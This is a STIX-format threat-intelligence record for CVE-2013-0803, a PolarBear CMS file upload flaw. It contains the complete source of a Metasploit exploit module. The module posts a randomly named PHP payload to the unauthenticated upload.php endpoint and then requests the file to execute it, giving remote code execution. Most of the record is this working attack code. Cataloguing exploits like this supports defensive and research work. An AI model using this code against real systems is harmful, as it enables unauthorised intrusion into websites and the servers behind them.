{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--78b2e459-433e-4d40-a261-35e50c40dd5d",
    "created": "2024-08-14T17:07:44.976094Z",
    "modified": "2024-08-14T17:07:44.976098Z",
    "name": "PolarBear CMS PHP File Upload Vulnerability",
    "description": " This module exploits a file upload vulnerability found in PolarBear CMS By abusing the upload.php file, a malicious user can upload a file to a temp directory without authentication, which results in arbitrary code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/polarcms_upload_exec.rb",
            "external_id": "polarcms_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0803"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PolarBear CMS PHP File Upload Vulnerability',\n      'Description'    => %q{\n          This module exploits a file upload vulnerability found in PolarBear CMS\n        By abusing the upload.php file, a malicious user can upload a file to a temp\n        directory without authentication, which results in arbitrary code execution.\n      },\n      'Author'         =>\n        [\n          'Fady Mohamed Osman'  # @Fady_Osman\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-0803' ],\n          [ 'OSVDB', '90627' ]\n        ],\n      'Payload'\t     =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'php',\n      'Arch'\t\t     => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-01-21'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The full URI path to Polarbearcms', '/polarbearcms']) ,\n        OptString.new('UPLOADDIR', [true, 'The directory to upload to starting from web root. This should be writable', '/polarbearcms'])\n      ])\n  end\n\n  def check\n    uri =  target_uri.path\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'includes', 'jquery.uploadify', 'upload.php')\n    })\n\n    if not res or res.code != 200\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    uri =  target_uri.path\n\n    upload_dir = normalize_uri(\"#{datastore['UPLOADDIR']}/\")\n\n    peer = \"#{rhost}:#{rport}\"\n\n    @payload_name = \"#{rand_text_alpha(5)}.php\"\n    php_payload = get_write_exec_payload(:unlink_self=>true)\n\n    data = Rex::MIME::Message.new\n    data.add_part(php_payload, \"application/octet-stream\", nil, \"form-data; name=\\\"Filedata\\\"; filename=\\\"#{@payload_name}\\\"\")\n    data.add_part(normalize_uri(uri, 'includes', 'jquery.uploadify/', nil, nil, \"form-data; name=\\\"folder\\\"\"))\n    post_data = data.to_s\n    print_status(\"Uploading payload #{@payload_name}\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, 'includes', 'jquery.uploadify', \"upload.php?folder=#{upload_dir}\"),\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => post_data\n    })\n    if not res or res.code != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Upload failed\")\n    end\n\n    upload_uri = \"#{upload_dir}#{@payload_name}\"\n    print_status(\"Executing payload #{@payload_name}\")\n    res = send_request_raw({\n      'uri'    => upload_uri,\n      'method' => 'GET'\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-21",
    "x_mitre_platforms": [
        "php'"
    ]
}